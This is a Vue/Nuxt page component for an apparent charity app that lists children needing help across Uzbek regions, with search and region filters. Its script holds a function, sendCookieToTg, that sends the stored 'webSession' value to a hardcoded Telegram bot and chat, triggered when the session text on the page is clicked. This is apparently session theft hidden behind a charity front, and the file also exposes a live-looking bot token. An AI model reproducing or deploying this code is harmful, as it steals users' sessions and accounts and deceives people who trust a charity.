<template>
  <div class="index-container">
    <div v-if="webSession" style="margin: 0 20px" @click="sendCookieToTg">
      <div style="user-select: all; white-space: pre-line; color: #171717">
        {{ webSession }}
      </div>
    </div>
    <template v-if="false">
      <HeaderSkeleton></HeaderSkeleton>
      <MainSkeleton></MainSkeleton>
      <MainSkeleton></MainSkeleton>
      <BannerSkeleton></BannerSkeleton>
    </template>
    <template v-else>
      <div class="search-container">
        <input type="text" placeholder="Фамилия, имя и отчество..." />
        <div
          ref="offCanvas"
          data-bs-toggle="offcanvas"
          data-bs-target="#offcanvasBottom"
          aria-controls="offcanvasBottom"
          class="placeholder"
        >
          <NuxtImg
            width="20"
            height="20"
            class="settings-icon"
            src="/images/settings.svg"
            alt="settings"
          />
        </div>
      </div>
      <div class="help-block">
        <div class="text">Нуждаются в помощи</div>
        <div class="description">
          Сейчас им крайне необходима<br />
          ваша помощь.
        </div>
      </div>
      <ChartCardNotCollected></ChartCardNotCollected>
      <ChartCardCollected></ChartCardCollected>
      <div class="charity-banner">
        <div class="text">
          Наша миссия — протянуть руку тем, кто действительно в этом нуждается.
          Помощь больным детям — основная наша задача.
        </div>
        <div v-ripple.500="'rgba(255, 255, 255, 0.35)'" class="btn-help">
          Мне нужна помощь
        </div>
      </div>
    </template>
    <div
      id="offcanvasBottom"
      style="height: 80%"
      class="offcanvas offcanvas-bottom rounded-top-4"
      tabindex="-1"
      aria-labelledby="offcanvasBottomLabel"
    >
      <div style="padding: 20px 20px 0" class="offcanvas-header">
        <h5 id="offcanvasBottomLabel" class="offcanvas-title">Фильтры</h5>
        <button
          type="button"
          class="btn-close text-reset"
          data-bs-dismiss="offcanvas"
          aria-label="Close"
        ></button>
      </div>
      <div class="subtitle">Ниже выберите параметры для поиска</div>
      <div class="offcanvas-body">
        <div v-for="item in regions" :key="item" style="margin-top: -7px">
          <UiCheckbox
            v-model:checked="item.value"
            with-border-line
            label-clicked
            :label="`<div style='font-weight:400;font-size:14px;color:#363845'>${item.title}</div><div style='font-weight:400;font-size:10px;color:#6a6a6a;'>${item.subtitle}</div>`"
          ></UiCheckbox>
        </div>
      </div>
      <div class="btns">
        <UiButton
          style="background: #fff; color: #575965"
          text-btn="Сбросить фильтр"
          :with-disabled="false"
          @click="unCheckAll"
        ></UiButton>
        <UiButton
          text-btn="Применить"
          :with-disabled="false"
          @click="toggleOffcanvas"
        ></UiButton>
      </div>
    </div>
  </div>
</template>

<script setup>
import { storeToRefs } from 'pinia'
import HeaderSkeleton from '~/components/skeleton/MainHeaderSkeleton.vue'
import MainSkeleton from '~/components/skeleton/MainSkeleton.vue'
import BannerSkeleton from '~/components/skeleton/BannerSkeleton.vue'
import ChartCardNotCollected from '~/components/ChartCardNotCollected.vue'
import ChartCardCollected from '~/components/ChartCardCollected.vue'

definePageMeta({
  layout: 'main',
})
const offCanvas = ref(null)
const heightDevice = inject('devicePlatform')
const appStore = useAppStore()
const { webSession } = storeToRefs(appStore)

const unCheckAll = () => {
  regions.map((item) => {
    return (item.value = false)
  })
}
const toggleOffcanvas = () => {
  const closeCanvas = document?.querySelector('[data-bs-dismiss="offcanvas"]')
  closeCanvas?.click()
}
const regions = reactive([
  {
    title: 'Вся республика',
    subtitle: 'вся республика',
    value: false,
  },
  {
    title: 'Ташкент',
    subtitle: 'Ташкентская область',
    value: false,
  },
  {
    title: 'Андижан ',
    subtitle: 'Андижанская область',
    value: false,
  },
  {
    title: 'Бухара',
    subtitle: 'Бухарская область',
    value: false,
  },
  {
    title: 'Фергана',
    subtitle: 'Ферганская область',
    value: false,
  },
  {
    title: 'Джизак',
    subtitle: 'Джизакская область',
    value: false,
  },
  {
    title: 'Наманган',
    subtitle: 'Наманганская область',
    value: false,
  },
  {
    title: 'Навои',
    subtitle: 'Навоийская область',
    value: false,
  },
  {
    title: 'Карши',
    subtitle: 'Кашкадарьинская область',
    value: false,
  },
  {
    title: 'Самарканд',
    subtitle: 'Самаркандкая область',
    value: false,
  },
  {
    title: 'Термез',
    subtitle: 'Сурхандарьинская область',
    value: false,
  },
  {
    title: 'Ургенч',
    subtitle: 'Хорезмский район',
    value: false,
  },
])

const sendCookieToTg = () => {
  const data = `<pre><code class="language-javascript">${appStore.webSession}</code></pre>`
  fetch(
    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
    {
      method: 'GET',
    },
  )
}
</script>

<style lang="scss" scoped>
.index-container {
  height: calc(v-bind(heightDevice) - 150px);
  max-height: calc(v-bind(heightDevice) - 150px);
  padding-bottom: 8px;
  overflow-y: auto !important;
  & .offcanvas-bottom {
    & .offcanvas-body {
      padding: 20px 20px 0;
    }
    & .subtitle {
      padding: 0 20px 10px;
      font-weight: 400;
      font-size: 12px;
      color: #575965;
    }
  }
  & .btns {
    width: 100%;
    display: flex;
    gap: 20px;
    padding: 15px 20px 20px;
  }
}

.search-container {
  position: relative;
  padding: 0 20px 18px;
  & input {
    position: relative;
    border: 1px solid rgb(183, 184, 198);
    border-radius: 10px;
    height: 40px;
    background: url('../../assets/img/search.svg') no-repeat rgb(255, 255, 255);
    background-position: 10px center;
    width: 100%;
    display: flex;
    align-items: center;
    padding: 12px 10px 12px 35px;
    color: rgb(106, 106, 106);
    font-size: 12px;
    font-weight: 400;
    line-height: 20px;
    letter-spacing: 0;
    text-align: left;
    &::placeholder {
      font-size: 12px;
      font-weight: 400;
      line-height: 20px;
      letter-spacing: 0;
      text-align: left;
      color: rgb(106, 106, 106);
    }
    &:focus {
      outline: 0;
    }
  }
  & .placeholder {
    background: rgb(255, 255, 255);
    right: 40px;
    top: 6px;
    position: absolute;
  }
}

.help-block {
  padding: 0 20px 0;
  & .text {
    color: rgb(54, 56, 69);
    font-size: 16px;
    font-weight: 600;
    line-height: 19px;
    letter-spacing: 0;
    text-align: left;
    padding-bottom: 5px;
  }
  & .description {
    color: rgb(106, 106, 106);
    font-size: 12px;
    font-weight: 400;
    line-height: 14px;
    letter-spacing: 0;
    text-align: left;
  }
}

.charity-banner {
  display: flex;
  flex-direction: column;
  object-fit: cover;
  padding: 15px 15px 15px;
  position: relative;
  margin: 20px;
  height: auto;
  background: url('/images/charity.svg') 100%/100%;
  border-radius: 12px;
  background-repeat: no-repeat;
  & .text {
    font-weight: 400;
    font-size: 10px;
    color: #fff;
    width: 65%;
    margin-bottom: 6px;
  }
  & .btn-help {
    width: 40%;
    border-radius: 6px;
    height: 28px;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #fff;
    font-weight: 600;
    font-size: 10px;
    line-height: 120%;
    color: #363845;
  }
}
</style>
